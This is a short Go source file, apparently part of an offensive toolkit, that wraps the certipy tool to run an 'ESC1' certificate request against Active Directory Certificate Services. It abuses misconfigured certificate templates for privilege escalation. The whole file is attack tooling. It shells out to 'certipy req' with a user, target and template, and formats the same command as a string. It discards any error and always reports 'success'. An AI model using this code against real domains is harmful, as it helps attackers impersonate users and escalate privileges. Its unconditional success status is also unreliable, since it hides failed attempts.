package adcs

import (
"fmt"
"os/exec"
)

type ESCResult struct {
Status string
Output string
}

type ESC1 struct {
Target   string
Template string
User     string
}

func (e ESC1) RequestCertificate() ESCResult {
cmd := exec.Command("certipy", "req", "-u", e.User, "-target", e.Target, "-template", e.Template)
out, _ := cmd.Output()
return ESCResult{Status: "success", Output: string(out)}
}

func (e ESC1) FormatCommand() string {
return fmt.Sprintf("certipy req -u %s -target %s -template %s", e.User, e.Target, e.Template)
}
